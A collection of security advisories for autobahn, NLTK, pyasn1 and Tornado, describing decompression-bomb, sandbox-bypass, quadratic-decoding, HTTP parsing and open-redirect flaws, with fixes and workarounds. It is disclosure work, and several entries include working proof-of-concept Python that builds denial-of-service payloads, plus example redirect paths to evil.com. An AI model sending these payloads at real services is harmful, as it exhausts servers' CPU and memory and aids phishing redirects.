vulns.description: ### Summary  permessage-brotli inflates each frame fully before checking maxMessagePayloadSize, so one 421-byte frame makes the server allocate about 545 MiB even with a 1 MiB message limit (brotli expands about 1,000,000:1). Any unauthenticated client can exhaust server memory this way on servers that enable permessage-brotli. This bypasses the GHSA-hxp9-w8x3-p566 fix.  ### Details  In 26.7.1 the receive path passes the remaining `maxMessagePayloadSize` budget to `decompress_message_data(..., max_output_len=...)`. deflate and bzip2 stop at that budget. `PerMessageBrotli.decompress_message_data` (`compress_brotli.py`) instead calls `self._decompressor.process(data)` with no limit and compares the length afterwards, so the whole frame is inflated first.  The code comment and changelog say this is still "bounded on the wire by `maxFramePayloadSize`", but brotli reaches about 1,000,000:1 (841 bytes inflate to 1 GiB), so that bound means little. A 421-byte frame against a 1 MiB budget peaks at 545 MiB before the 1009 rejection.  An autobahn asyncio server on 127.0.0.1 accepting permessage-brotli, with `maxFramePayloadSize=64 KiB` and `maxMessagePayloadSize=1 MiB`, received one small brotli frame from an autobahn client and peaked at 545 MiB (baseline 28 MiB). A few concurrent connections can exhaust memory.  brotli ≥ 1.2.0 has `Decompressor.process(data, output_buffer_limit=N)`, so the backend can stop at `max_output_len` like deflate and bzip2 (and the extra's floor can be raised to `brotli>=1.2.0`).  Tested on autobahn 26.7.1 (latest) with brotli 1.2.0; `compress_brotli.py` on master is unchanged. This affects servers that enable permessage-brotli (opt-in, needs the `compress` extra).  ### Proof of concept  How to run the PoC ``` python3 -m venv venv && . venv/bin/activate pip install autobahn==26.7.1 brotli==1.2.0 python3 poc_autobahn.py ```  ```python # PoC: autobahn 26.7.1 permessage-brotli inflates a whole frame before maxMessagePayloadSize is checked. import brotli, resource from autobahn.websocket.compress import PerMessageBrotli  c = brotli.Compressor()  # build a 256 MiB-of-zeros frame without holding the plaintext frame = b"".join(c.process(b"\0" * (1 << 20)) for _ in range(256)) + c.finish() pmce = PerMessageBrotli(is_server=True, server_no_context_takeover=False, client_no_context_takeover=False) pmce.start_decompress_message() print(len(frame), "bytes on the wire; peak RSS before:", resource.getrusage(resource.RUSAGE_SELF).ru_maxrss >> 10, "MiB") try:     pmce.decompress_message_data(frame, max_output_len=1 << 20)  # remaining budget: 1 MiB except Exception as e:     print(type(e).__name__, "| peak RSS after:", resource.getrusage(resource.RUSAGE_SELF).ru_maxrss >> 10, "MiB") ```  Output: ``` 421 bytes on the wire; peak RSS before: 36 MiB PayloadExceededError | peak RSS after: 545 MiB ```  ### Impact  An unauthenticated WebSocket client can make a server that enabled permessage-brotli allocate hundreds of MB or more per tiny frame, regardless of the configured `maxMessagePayloadSize`. That is the memory-exhaustion DoS GHSA-hxp9-w8x3-p566 was meant to prevent.  Credit goes to Adrian Korwel.

### Summary  Several model-artifact APIs still treat caller-controlled model paths as ordinary filenames even when NLTK path security is enforced. The same outside-root paths are rejected by guarded helpers, but these public read and write flows still use raw file APIs.  ### Details  - **Vulnerability type:** File sandbox bypass - **Affected component:** `TransitionParser.train`, `TransitionParser.parse`, `AveragedPerceptron.save`, `AveragedPerceptron.load`, `PerceptronTagger.save_to_json`, `save_maxent_params` - **Affected versions:** Published `3.9.4` and current source `v3.10.0-rc2` both reproduced. - **Patched versions:** Not yet patched - **Root cause:** Model import and export helpers use built-in `open()` on caller-controlled paths instead of pathsec-aware helpers.  `TransitionParser.train()` writes outside allowed roots, `TransitionParser.parse()` reads outside allowed roots, `AveragedPerceptron` bypasses the sandbox in both directions, and adjacent read-side helpers in the same family already show the intended guarded behavior. I confirmed outside-root reads and writes while `pathsec.open()` or the guarded sibling helpers rejected the same paths.  ### PoC  **Preconditions** - The application enables `pathsec` enforcement and lets untrusted workflows choose model import or export paths.  **Steps** 1. Enable `pathsec.ENFORCE=True` and restrict allowed roots to a dedicated sandbox directory. 2. Use public model import or export APIs with paths that point outside that root. 3. Observe the same paths are rejected by negative-control guarded helpers such as `pathsec.open()`, `PerceptronTagger.load_from_json()`, or `load_maxent_params()`. 4. Observe the vulnerable APIs still read or write outside-root files successfully.  **Minimal reproducible excerpt**  ```text transition_train_exists True transition_parse_loader_read_bytes 13 averaged_load_keys ['bias'] maxent_save wrote ['alwayson.tab', 'labels.txt'] ```  ### Impact  Consumers that rely on `pathsec` for local containment can be tricked into reading or overwriting files outside approved roots through normal model persistence and loading APIs.  ### Remediation  Route all model-path file access through `nltk.pathsec.open()` or existing pathsec-aware helpers, and add regression tests that pair each vulnerable API with a negative control on the same path.  ### References  - https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/parse/transitionparser.py#L551-L571 - https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/tag/perceptron.py#L106-L113 - https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/tag/perceptron.py#L262-L273 - https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/classify/maxent.py#L1583-L1602

## Summary  In pyasn1 through 0.6.4, decoding a constructed BIT STRING with many fragments repeatedly shifts and copies the entire value accumulated so far. For fixed-size fragments, CPU time grows quadratically with the encoded input size. An application that passes sufficiently large, attacker-controlled ASN.1 data to an affected decoder can suffer CPU exhaustion during `decode()`; no conversion or formatting of the decoded value is required.  The BER and CER decoders reach this path for constructed BIT STRING values, with or without an `asn1Spec`. The DER decoder rejects constructed BIT STRING in schema-less decoding, but its schema-driven path accepts a **definite-length** constructed BIT STRING when given a matching `asn1Spec` and reaches the same vulnerable code. Constructed BIT STRING is not valid DER; this DER exposure is due to decoder permissiveness. DER rejects the indefinite-length form.  This is a separate decoder path from the OBJECT IDENTIFIER accumulation fixed in [CVE-2026-59885](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj).  ## Technical details  In the 0.6.4 [`BitStringPayloadDecoder`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L173-L301), both the [definite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L237-L255) and [indefinite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L275-L301) fragment loops call `BitString.fromOctetString(..., prepend=bitString)` for every fragment. [`fromOctetString`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/type/univ.py#L614-L627) shifts the growing `SizedInteger` left by the fragment's bit length and ORs in the fragment. Shifting an ever-larger Python integer for each fixed-size fragment makes total work O(n²) for n fragments. The fragments are siblings, so the decoder's nesting-depth limit does not constrain their count; its limit on the number of length octets does not prevent the demonstrated inputs.  In 0.6.4, DER's [tag-driven map](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L40) disables constructed BIT STRING, while its schema-driven type map retains the inherited decoder that permits it. This explains why a schema-less DER rejection is not a negative result for all DER decoding.  Under [X.690](https://www.itu.int/rec/T-REC-X.690-202102-I/en), a conforming CER constructed BIT STRING uses an indefinite-length outer encoding and primitive fragments with 1000 contents octets except possibly the last. That form reaches the affected indefinite-length loop. DER requires primitive string encoding, although the schema-driven pyasn1 decoder accepts the definite-length constructed example below.  ## Impact  An application is exposed when untrusted input can reach one of the affected decoder paths and its input limits admit enough fragments. The work occupies the decoding thread or worker and may cause denial of service. Whether the input is network-accessible or unauthenticated depends on the calling application. This advisory makes no claim that every application using pyasn1, or any particular protocol implementation, accepts such input.  ## Severity assessment (CVSS v3.1)  The 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER values trigger the issue without special conditions, privileges, or user interaction. Repeated crafted values could occupy a finite decoder-worker pool and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not claim that every application is network-exposed or fully unavailable; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).  ## Reproducer  The definite-length example below is valid BER. It is deliberately not a conforming CER or DER encoding. The second constructor uses conforming CER fragment sizing and framing. CPU times are machine-dependent; run the larger cases only in a local test environment.  ```python import time  from pyasn1.codec.ber import decoder as ber_decoder from pyasn1.codec.cer import decoder as cer_decoder from pyasn1.codec.der import decoder as der_decoder from pyasn1.error import PyAsn1Error from pyasn1.type import univ   def encode_length(size):     octets = size.to_bytes((size.bit_length() + 7) // 8, "big")     return bytes((0x80 | len(octets),)) + octets   def definite_fragments(count):     body = b"\x03\x02\x00\xa5" * count  # one data octet per BIT STRING fragment     return b"\x23" + encode_length(len(body)) + body   def cer_fragments(count):     # Each primitive fragment has 1000 contents octets: one unused-bits     # octet (zero) followed by 999 data octets.     fragment = b"\x03" + encode_length(1000) + b"\x00" + b"\xa5" * 999     return b"\x23\x80" + fragment * count + b"\x00\x00"   def measure(label, decode, payload, **options):     start = time.process_time()     value, remainder = decode(payload, **options)     print(label, len(payload), f"{time.process_time() - start:.3f}s CPU")     assert not remainder and len(value) > 0   for count in (50_000, 100_000, 200_000):     measure(f"BER {count} fragments", ber_decoder.decode,             definite_fragments(count))  for count in (1_000, 2_000, 4_000):     measure(f"CER {count} fragments", cer_decoder.decode,             cer_fragments(count))  sample = definite_fragments(1_000) measure("DER with BIT STRING schema", der_decoder.decode, sample,         asn1Spec=univ.BitString()) try:     der_decoder.decode(sample) except PyAsn1Error:     print("DER without schema rejects the constructed value") else:     raise AssertionError("DER unexpectedly accepted schema-less input") ```  ## Verification  Local measurements of the official v0.6.4 tag on CPython 3.14.8 used `time.process_time()`. A local 0.6.5 candidate containing the fix was timed on the same machine. Times are illustrative, not a guaranteed cost on other systems.  | Input | Size | v0.6.4 CPU | 0.6.5 candidate CPU | | --- | ---: | ---: | ---: | | BER definite, 50,000 fragments | 0.20 MB | 0.530 s | 0.084 s | | BER definite, 100,000 fragments | 0.40 MB | 1.915 s | 0.170 s | | BER definite, 200,000 fragments | 0.80 MB | 7.392 s | 0.344 s | | Conforming CER, 1,000 fragments | 1.004 MB | 0.163 s | 0.0035 s | | Conforming CER, 2,000 fragments | 2.008 MB | 0.657 s | 0.0070 s | | Conforming CER, 4,000 fragments | 4.016 MB | 2.582 s | 0.0144 s |  The definite BER input with 100,000 fragments also decoded through DER with `asn1Spec=univ.BitString()` in 1.949 s on v0.6.4, versus 0.172 s with the 0.6.5 candidate. Schema-less DER rejected the same input. Independent reports reproduced the old behavior on v0.6.4: one measured 21.1 s for a 1.28 MB definite-length value; another measured 7.25 s for a 0.8 MB value versus 2.8 ms for a primitive BIT STRING carrying the same data volume. These measurements were taken on different systems and should not be compared as a single benchmark series.  ## Resolution  Upgrade to pyasn1 0.6.5. The decoder assembles fragment bits in a `bytearray`, preserves decoded bit values including intermediate-fragment padding, and converts the complete payload to a BIT STRING once. This removes the repeated shift of the growing integer in both constructed decoding loops.  For applications that cannot upgrade immediately, enforce an application-appropriate limit on untrusted ASN.1 input size **before** passing it to pyasn1. Such a limit bounds exposure but does not change the quadratic behavior of 0.6.4. Where a protocol forbids constructed BIT STRING, rejecting that encoding before decoding also prevents this path.

### Summary  When an application decodes attacker-controlled BER, CER, or DER data without an ASN.1 schema, a container with many distinct long tag IDs can cause quadratic CPU use. Repeated inputs can exhaust CPU and reduce service availability.  ### Details  ConstructedPayloadDecoderBase._decodeComponentsSchemaless inserts every decoded component’s TagSet into a growing set, although it only needs to distinguish one tag set from two or more. Attacker-chosen tag IDs can have colliding TagSet hashes, making each later insertion compare against an increasing number of earlier tags. This path is present in v0.6.4 and is inherited by the CER and DER decoders. The proposed fix stops growing the classification set after it contains two distinct tag sets, while retaining every decoded component and its order.  On v0.6.4 with CPython 3.12.10, increasing the collision input from 3,200 to 6,400 components raised decode CPU time from 0.438 to 1.747 seconds; a comparable control rose from 0.031 to 0.065 seconds. Both inputs decoded successfully with the expected values and an empty remainder.  ### Proof of concept  Run this outside the repository checkout in a fresh Python 3.12 environment with pyasn1==0.6.4 installed:  ```python import sys import time  from pyasn1.codec.ber import decoder from pyasn1.type import univ   def enc_tag(tag_id):     groups = [tag_id & 0x7f]     tag_id >>= 7     while tag_id:         groups.append((tag_id & 0x7f) | 0x80)         tag_id >>= 7     return b'\xbf' + bytes(reversed(groups))   def payload(tag_ids):     body = b''.join(enc_tag(tag_id) + b'\x03\x04\x01A'                     for tag_id in tag_ids)     length = len(body).to_bytes((len(body).bit_length() + 7) // 8, 'big')     return b'\x30' + bytes([0x80 | len(length)]) + length + body   for count in (3200, 6400):     cases = (         ("collision", [32 + i * sys.hash_info.modulus                        for i in range(count)]),         ("control", [(1 << 70) + i for i in range(count)]),     )     for name, tag_ids in cases:         wire = payload(tag_ids)         start = time.process_time()         value, remainder = decoder.decode(wire)         cpu_seconds = time.process_time() - start          assert type(value) is univ.Sequence         assert len(value) == count and remainder == b''         for position, tag_id in enumerate(tag_ids):             component = value.getComponentByPosition(position)             assert component.asOctets() == b'A'             assert component.tagSet[-1].tagId == tag_id          print(count, name, len(wire), round(cpu_seconds, 3)) ```  ### Impact  Applications that pass attacker-controlled bytes to schemaless BER, CER, or DER decoding can spend disproportionate CPU time on a relatively small, valid input. The demonstrated impact is availability; no confidentiality or integrity impact was observed.

## Summary  In pyasn1 0.6.4 and earlier, decoding a binary-encoded ASN.1 REAL with a large mantissa can consume CPU time quadratic in the mantissa length. The BER, CER, and DER decoders all use the affected `RealPayloadDecoder`. An application is exposed when it passes attacker-controlled ASN.1 containing a REAL value to one of these decoders, either without an `asn1Spec` or with a schema that includes REAL. The work occurs inside `decode()`; the application does not need to convert, print, or otherwise use the resulting REAL object.  This is distinct from [CVE-2026-59886](https://github.com/advisories/GHSA-hm4w-wwcw-mr6r), which concerns converting an already-decoded REAL to a Python float. That issue was fixed in 0.6.4 and its advisory states that decoding alone does not trigger it.  ## Root cause and affected components  For binary REAL values, [`RealPayloadDecoder.valueDecoder` in v0.6.4](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L535-L603) builds the mantissa one octet at a time:  ```python p = 0 while chunk:     p <<= 8     p |= chunk[0]     chunk = chunk[1:] ```  Each shift processes an integer that grows with the mantissa; with byte strings, each slice also copies the remaining suffix. Repeating both operations for every octet makes decoding quadratic in mantissa size. The decoder's [eight-octet length-field limit](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1704-L1717) does not impose a practical mantissa-size limit for the inputs demonstrated below. [CER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/cer/decoder.py#L51-L62) and [DER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L23-L31) reuse the BER REAL payload decoder, so all three paths reach this loop.  The vulnerable loop is present in every available repository release tag inspected, from v0.2.1 through v0.6.4. Runtime measurements below were made on v0.6.4; older releases were checked for the loop, not benchmarked individually.  ## Impact  A comparatively small REAL value can hold a decoder worker on one CPU core for seconds or longer. The attacker must be able to supply data that the application sends to an affected decoder, and application-level input limits may reduce exposure. The demonstrated effect is CPU exhaustion during decoding; this advisory does not assert a network endpoint, unauthenticated access, or an affected downstream application by itself.  ## Reproduction and evidence  The following example uses pyasn1 0.6.4. The `0x09` tag identifies REAL; `0x80 0x00` selects a positive, base-2 binary value with a one-octet zero exponent, followed by a large mantissa. It exercises `decode()` only.  ```python import time  from pyasn1.codec.ber import decoder as ber from pyasn1.codec.cer import decoder as cer from pyasn1.codec.der import decoder as der   def real_value(mantissa_octets):     content = b"\x80\x00" + b"\xff" * mantissa_octets     length = len(content).to_bytes(3, "big")     return b"\x09\x83" + length + content   for codec in (ber, cer, der):     for size in (50_000, 100_000, 200_000):         substrate = real_value(size)         started = time.process_time()         value, rest = codec.decode(substrate)         print(codec.__name__, size, time.process_time() - started)         assert not rest         assert tuple(value)[1:] == (2, 0) ```  The original report measured the following BER CPU times on repository commit `aa05757`. That commit is later than the official v0.6.4 tag; the vulnerable loop is identical in the tagged release.  | Mantissa size | Reporter's BER CPU time | | ---: | ---: | | 50,000 octets | 0.328 s | | 100,000 octets | 1.299 s | | 200,000 octets | 6.043 s | | 400,000 octets | 24.095 s |  The same report measured 5.645 s for a 200,000-octet mantissa through DER.  A separate local reproduction on the official v0.6.4 tag (`d43496f`, CPython 3.14.8, macOS arm64) measured BER at 0.209 s, 0.884 s, and 3.451 s for 50,000, 100,000, and 200,000 mantissa octets respectively. CER and DER each took about 0.89 s at 100,000 octets. These are machine-specific measurements; the repeated near-fourfold cost for doubled input is the relevant result. Neither reproduction calls `float()`, `str()`, or `prettyPrint()`.  ## Fix  pyasn1 0.6.5 replaces the per-octet shift and slice loop with one `int.from_bytes(bytes(chunk), "big")` conversion. Sign, scale, exponent, and the decoded REAL tuple are preserved. The fix is in the shared BER payload decoder and therefore covers BER, CER, and DER. A local check of the 0.6.5 candidate decoded a 200,000-octet mantissa correctly through all three codecs; the check does not establish behavior for every application using REAL.  ## Workarounds  Upgrade to pyasn1 0.6.5. Until then, reject or strictly limit attacker-controlled ASN.1 input that may contain REAL values before passing it to pyasn1. The appropriate size limit depends on the application's available CPU time and request volume.

## Summary  In pyasn1 0.6.4 and earlier, decoding a constructed OCTET STRING or character string made of many fragments can spend disproportionate CPU time repeatedly copying the accumulated value. A separate indefinite-length `ANY` path has the same problem while collecting the encoded components. The work grows roughly quadratically with the number of fixed-size fragments, although the input and decoded value grow linearly. An application that lets an attacker supply such ASN.1 input to an affected decoder can suffer CPU exhaustion.  The affected string paths are available in BER and CER. The DER decoder also accepts certain *non-DER* constructed strings: a definite-length constructed OCTET STRING when an `asn1Spec` selects `univ.OctetString`, and constructed character strings such as UTF8String even without a schema. Indefinite-length `ANY` is affected in BER and CER when an `asn1Spec` selects `univ.Any`; DER rejects indefinite lengths.  This is a distinct decoder path from the OBJECT IDENTIFIER/RELATIVE-OID accumulation addressed by [CVE-2026-59885](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj). It has the same complexity class, but the OID fix in 0.6.4 did not change these string or `ANY` loops.  ## Technical details  In the [v0.6.4 BER decoder](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py), `OctetStringPayloadDecoder` appends each decoded fragment to a growing `bytes` value with `header += component` in both its [definite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L338-L351) and [indefinite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L368-L387) constructed forms. [`AnyPayloadDecoder.indefLenValueDecoder`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1403-L1430) similarly uses `chunk += component`. In the exercised paths, each concatenation copies an increasingly large prefix. For `N` fixed-size fragments, the total copied data grows with `1 + 2 + ... + N`, or O(N²).  The OCTET STRING decoder is also the base class of the decoders for UTF8String, NumericString, PrintableString, TeletexString, VideotexString, IA5String, GraphicString, VisibleString, GeneralString, UniversalString, BMPString, ObjectDescriptor, GeneralizedTime, and UTCTime. These types inherit the same constructed-string reassembly path.  The [DER decoder's OCTET STRING restriction](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L49) replaces the tag-driven decoder, but its schema-driven `TYPE_MAP` retains the BER-derived decoder. Thus `der.decode(data)` rejects a constructed OCTET STRING, while `der.decode(data, asn1Spec=univ.OctetString())` accepts its definite-length form and reaches the accumulation loop. DER does not replace the inherited character-string decoders, so a constructed UTF8String is also accepted without `asn1Spec`. These inputs violate [X.690's DER string-encoding rule](https://www.itu.int/rec/T-REC-X.690-202102-I/en) and should not be described as valid DER encodings.  The original short-fragment, definite-length OCTET STRING reproducer is valid BER. The CER decoder accepts it, but it is not a conforming CER string encoding: X.690 requires an indefinite-length outer constructed string and 1,000 contents octets per fragment except possibly the last. A conforming CER-shaped constructed OCTET STRING with those fragment sizes also reaches the loop and shows quadratic growth. The indefinite-length `ANY` reproducer below can represent a CER `SEQUENCE OF OCTET STRING` and reaches the separate `ANY` loop when decoded with an `ANY` schema.  The decoder's eight-octet length-field limit and nesting-depth limit do not bound the number of sibling fragments in these examples. The BER reproducer below uses only a three-octet outer length field; all fragments have shallow nesting. There is no per-message fragment-count cap in v0.6.4.  ## Impact  If an application passes attacker-controlled ASN.1 to the affected `decode()` or `StreamingDecoder` path without an adequate input or resource limit, a megabyte-scale value can occupy a decoding worker for seconds. Repeated inputs can exhaust available CPU. Whether this is reachable before authentication, or through a particular protocol, depends on the application; the library finding alone does not establish those conditions. No confidentiality or integrity impact is claimed.  ## Severity assessment (CVSS v3.1)  The 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER inputs trigger the string-reassembly issue without special conditions, privileges, or user interaction. Repeated crafted inputs could occupy all available decoder workers and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not assert that every adopter has such an endpoint or loses all service; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).  On the official v0.6.4 tag, local CPU-time measurements with CPython 3.14.8 on macOS arm64 gave the following results. Times vary by machine and Python runtime; the input-size scaling is the relevant observation. “Fixed” means the local 0.6.5 decoder fix applied to the same inputs.  | Decoder path and input | Fragments | v0.6.4 CPU | Fixed CPU | | --- | ---: | ---: | ---: | | BER constructed OCTET STRING, 0.40 MB | 100,000 × 2 payload bytes | 0.340 s | 0.160 s | | BER constructed OCTET STRING, 0.80 MB | 200,000 × 2 payload bytes | 0.886 s | 0.312 s | | BER constructed OCTET STRING, 1.60 MB | 400,000 × 2 payload bytes | 2.738 s | 0.623 s | | BER indefinite `ANY`, 0.30 MB | 100,000 × 1 payload byte | 0.459 s | 0.206 s | | BER indefinite `ANY`, 0.60 MB | 200,000 × 1 payload byte | 1.245 s | 0.412 s | | BER indefinite `ANY`, 1.20 MB | 400,000 × 1 payload byte | 3.980 s | 0.826 s | | CER constructed OCTET STRING, 1.00 MB, conforming fragment layout | 1,000 × 1,000 payload bytes | 0.0089 s | 0.0022 s | | CER constructed OCTET STRING, 2.01 MB, conforming fragment layout | 2,000 × 1,000 payload bytes | 0.0311 s | 0.0044 s | | CER constructed OCTET STRING, 4.02 MB, conforming fragment layout | 4,000 × 1,000 payload bytes | 0.1379 s | 0.0090 s |  For the same short-fragment layout, the original report measured up to 16.05 seconds for a 3.2 MB BER constructed OCTET STRING. An independent report on CPython 3.11.16/Linux measured 5.76 seconds for a 2.4 MB constructed OCTET STRING, versus about 0.005 seconds for a primitive OCTET STRING of comparable size. These are reporter measurements on different systems, not fixed performance guarantees.  ## Reproduction  This example uses public decoder APIs. Run it with pyasn1 0.6.4 and increase `n` to observe the scaling. The final two calls show the DER paths accepted by v0.6.4; their constructed encodings are not valid DER.  ```python import time  from pyasn1.codec.ber import decoder as ber from pyasn1.codec.cer import decoder as cer from pyasn1.codec.der import decoder as der from pyasn1.type import univ   def tlv(identifier, contents):     length = len(contents)     if length < 128:         return bytes((identifier, length)) + contents     encoded = length.to_bytes((length.bit_length() + 7) // 8, "big")     return bytes((identifier, 0x80 | len(encoded))) + encoded + contents   def measure(label, decode, substrate, asn1Spec=None):     start = time.process_time()     _, rest = decode(substrate, asn1Spec=asn1Spec)     assert not rest     print(f"{label}: {len(substrate)} input bytes, "           f"{time.process_time() - start:.3f} CPU seconds")   n = 100_000 octet_fragments = b"\x04\x02AA" * n utf8_fragments = b"\x0c\x02AA" * n  measure("BER constructed OCTET STRING", ber.decode,         tlv(0x24, octet_fragments)) measure("BER indefinite ANY", ber.decode,         b"\x30\x80" + b"\x04\x01A" * n + b"\x00\x00",         univ.Any())  # CER uses indefinite length and 1,000-content-octet primitive fragments. cer_fragment = tlv(0x04, b"A" * 1000) measure("CER constructed OCTET STRING", cer.decode,         b"\x24\x80" + cer_fragment * 1000 + b"\x00\x00")  # These constructed encodings are accepted by pyasn1 but are invalid DER. measure("DER OCTET STRING with schema", der.decode,         tlv(0x24, octet_fragments), univ.OctetString()) measure("DER UTF8String without schema", der.decode,         tlv(0x2c, utf8_fragments)) ```  ## Patch  pyasn1 0.6.5 replaces the growing `bytes` accumulator with a list of fragments and joins them once after decoding in all three affected loops. The OCTET STRING base-class change also covers the inheriting character-string decoders. This removes the repeated copying while preserving the assembled decoded value.  ## Workaround  Until upgrading, enforce application-appropriate limits on the size of untrusted ASN.1 input *before* passing it to pyasn1, and limit the CPU resources available to decoding workers. Applications that require DER can also reject constructed string encodings before invoking the decoder. The appropriate byte limit depends on the protocol and expected valid values.  ## Credits and references  Reported by [alimony](https://github.com/alimony). Independently reported by [manus-pi](https://github.com/manus-pi), whose report identified the schema-driven DER route, inherited character-string decoders, and additional performance evidence.  - [pyasn1 v0.6.4 affected decoder source](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py) - [ITU-T X.690, CER and DER string-encoding rules](https://www.itu.int/rec/T-REC-X.690-202102-I/en) - [CVE-2026-59885, separate OID decoder issue](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj)

### Summary  Tornado's HTTP header parser takes quadratic time (O(n²)) when a header value is continued across many "obsolete line folding" (obs-fold) lines. An unauthenticated attacker can send a request whose header block is mostly short continuation lines. Parsing it uses a large amount of CPU on the IOLoop thread and blocks every other connection that process is serving.  This issue is closely related to CVE-2025-67725 (GHSA-c98p-7wgm-6p64). The fix for that advisory covered repeated headers but not line-folded continuations.  ### Impact  All Tornado HTTP servers are affected. Header parsing runs before any application code, so no authentication or particular handler is required.  How bad it gets depends on `max_header_size`:  - **Default (64 KB):** each malicious request blocks the event loop for tens of milliseconds. Repeated requests can degrade service. - **Raised `max_header_size`:** the cost grows with the square of the header size. A single 1 MB request can block the process for several seconds.  Only availability is affected. Confidentiality and integrity are not.  ### Patches  Fixed in Tornado 6.6 by removing support for obsolete line folding completely; header lines that begin with whitespace are now rejected.  ### Workarounds  - Keep `max_header_size` at its default value or lower it. This limits the impact but doesn't remove it. - Run Tornado behind a reverse proxy that rejects or normalizes obsolete line folding before forwarding requests.  ### Credit  Reported by @manus-pi.

### Summary  When Tornado reads an HTTP/1.1 body that uses chunked transfer encoding, it processes all chunks that have already arrived without yielding to the event loop. A client can send a body made of millions of 1-byte chunks, which blocks the event loop (and therefore every other connection served by that process) for the entire time it takes to parse the body. A body near the default `max_body_size` of 100 MB can block the process for close to a minute, and the attacker can repeat or parallelize these requests.  Bodies made of tiny chunks also consumed far more memory than their size: a handler that does not use `@stream_request_body` stored each chunk as a separate object, using roughly 20 times as much memory as the bytes received.  ### Impact  All Tornado HTTP servers are affected when they receive a request body for a handler that reads it, which includes any handler that does not reject the request before the body is read. No authentication is required. Lowering `max_body_size` reduces the maximum blocking time and memory use for each request but does not remove the issue.  `SimpleAsyncHTTPClient` is affected in the same way when it reads a response from a malicious server.  ### Patches  Fixed in Tornado 6.6. Tornado now yields to the event loop periodically while reading any body, combines small chunks before passing them to `data_received`, and stores non-streaming bodies more compactly.  Applications using `@stream_request_body` should note that the pieces passed to `data_received` no longer correspond to HTTP chunk boundaries.  ### Workarounds  - Run Tornado behind a reverse proxy that buffers request bodies and forwards them with a `Content-Length` header instead of chunked encoding. - Lower `max_body_size` (for the whole server or for individual handlers) to limit the impact of each request.  ### Credit  Reported by [uttej-badwane](https://github.com/uttej-badwane).

### Summary  `tornado.web.RedirectHandler` builds its target URL by substituting parts of the request path into a template. Depending on where those substitutions appear in the template, an attacker can craft a request that redirects to a host of their choosing. This creates an open redirect on the application's domain, which can be used in phishing.  ### Impact  Applications are affected if they use `RedirectHandler` with a URL template where a regex capture group can influence the scheme or host of the redirect. This includes:  - **A substitution at the start of the path**, for example `(r"/(.*)/target", RedirectHandler, {"url": "/{0}/destination"})`. A request to `https://example.com//evil.com/target` redirects to `//evil.com/destination`, a protocol-relative URL pointing to evil.com. Variants using backslashes or encoded characters have the same effect, because browsers treat them as equivalent to `//`. - **A substitution directly after the host**, for example `(r"/old(.*)", RedirectHandler, {"url": "https://new.example.com{0}"})`. A request to `/old.evil.com/` or `/old@evil.com/` redirects to evil.com. - **A template that begins with a substitution** (such as `"{0}"`), which can be given an absolute URL.  Applications are not affected if their `RedirectHandler` templates use only static URLs, or if every substitution comes after a fixed host and a `/` (for example `"/static/{0}"` or `"https://example.com/{0}"`). Other uses of `RequestHandler.redirect()` are not affected by this advisory, although applications that pass user-controlled input to `redirect()` should validate it themselves.  ### Patches  Fixed in Tornado 6.6. `RedirectHandler` now returns a 400 error if the substituted values would change the scheme or host of the redirect from what the template specifies. As a result, substitutions can no longer be used in the scheme or host part of a template. The similar check in `StaticFileHandler` has also been hardened against backslash and whitespace variants.  ### Workarounds  - Change `RedirectHandler` templates so every substitution comes after a fixed prefix ending in `/`, or write capture-group regexes that cannot match characters such as `/`, `\`, `@`, `.` or `:` where they could affect the host. - Alternatively, replace `RedirectHandler` with a custom handler that validates the target before calling `self.redirect()`.  ### Credit  Reported by Longwei Wang (@gn00295120).

